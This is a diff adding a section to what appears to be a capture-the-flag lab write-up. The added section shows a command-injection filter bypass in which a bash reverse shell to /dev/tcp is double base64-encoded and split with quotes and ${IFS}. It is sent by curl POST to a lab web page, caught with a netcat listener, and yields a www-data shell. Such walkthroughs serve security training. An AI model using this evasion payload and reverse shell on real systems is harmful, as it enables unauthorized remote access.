@@ -224,6 +224,46 @@ anurodh  apaar  aurick
 ```
 
 
+To evade filtering, We try the very first technique on this URL:
+
+
+https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions
+
+
+```
+# echo "echo $(echo 'bash -i >& /dev/tcp/10.8.147.132/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
+echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNDRMakUwTnk0eE16SXZORFEwTkNBd1BpWXhD
+Zz09Cg==|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
+```
+
+
+Then, we run nc on out attacking box:
+
+
+```
+# nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+
+After this, we try again with our curl POST request:
+
+
+```
+# curl -X POST http://10.10.123.185/secret/index.php -d 'command=echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNDRMakUwTnk0eE16SXZORFEwTkNBd1BpWXhDZz09Cg==|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h'
+```
+
+
+And we get a shell!
+
+
+```connect to [10.8.147.132] from (UNKNOWN) [10.10.123.185] 44832
+bash: cannot set terminal process group (1050): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html/secret$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 
 
